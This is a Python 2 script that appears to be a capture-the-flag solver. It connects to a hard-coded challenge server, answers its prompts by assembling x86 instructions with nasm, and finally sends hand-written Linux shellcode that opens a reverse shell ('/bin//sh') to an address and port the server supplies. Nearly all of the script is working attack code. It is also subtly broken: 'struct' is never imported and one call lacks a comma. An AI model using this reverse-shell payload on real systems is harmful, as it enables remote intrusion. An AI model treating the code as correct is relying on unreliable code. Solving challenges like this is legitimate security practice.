# -*- coding: cp949 -*-
import sys
import socket
import os

def asm_send(asm):
    with open("test.asm","w") as f:
        f.write(asm)
    os.system("nasm test.asm")
    opcode = file("test").read().encode("hex")+"\n"
    print asm
    direct_send(opcode)

def direct_send(opcode):
    s.send(opcode)
    print opcode
    print s.recv(1024)
    print s.recv(1024)
    s.send("\n")
    print "=" * 100

def ip2long(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L" packedIP)[0]

#############################################################################

host = "121.78.147.159"
port = 55511

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

#############################################################################

recv = s.recv(1024)
print recv
recv = s.recv(1024)
print recv

asm = "BITS 32\n"
for i in range(1,10):
    try:
        if (recv.split('\n')[i]).find("Opcode") < 0:
            asm += "mov " + (recv.split('\n')[i]).split(" =")[0] + ", " +(recv.split(' =')[i]).split("\n")[0] + "\n"
    except IndexError as e:
        print(e)

asm_send(asm)

#############################################################################

recv = s.recv(1024)
print recv
recv = s.recv(1024)
print recv

asm = "BITS 32\n"
a = recv.index("| ")
b = recv.index(" |")
asm += "push "+recv[a+2:b]+"\n"
recv = recv[b+2:]

a = recv.index("| ")
b = recv.index(" |")
asm += "push "+recv[a+2:b]+"\n"
recv = recv[b+2:]

a = recv.index("| ")
b = recv.index(" |")
asm += "push "+recv[a+2:b]
recv = recv[b+2:]

asm_send(asm)

#############################################################################

recv = s.recv(1024)
print recv
recv = s.recv(1024)
print recv

a = recv.index("address: ")
b = recv.index("[+] port ")
tmp_host = recv[a+len("address: "):b-2]

a = recv.index("port : ")
b = recv.index("[+] exec")
tmp_port = recv[a+len("port : "):b-2]
tmp_port = int(tmp_port)

opcode = "31C031DB31C931D2B066B301516A066A016A0289E1CD8089C6B06631DBB30268"

host_hex = '{0:04X}'.format(ip2long(tmp_host))
opcode += host_hex

opcode+="6668"

port_hex = '{0:04X}'.format(tmp_port)
opcode += port_hex

opcode+="6653FEC389E16A10515689E1CD8031C9B103FEC9B03FCD8075F831C052686E2F7368682F2F626989E3525389E15289E2B010FEC8FEC8FEC8FEC8FEC8CD80"

print "host: " + host_hex
print "port: " + port_hex

direct_send(opcode+"\n")
recv = s.recv(1024)
print recv

#############################################################################












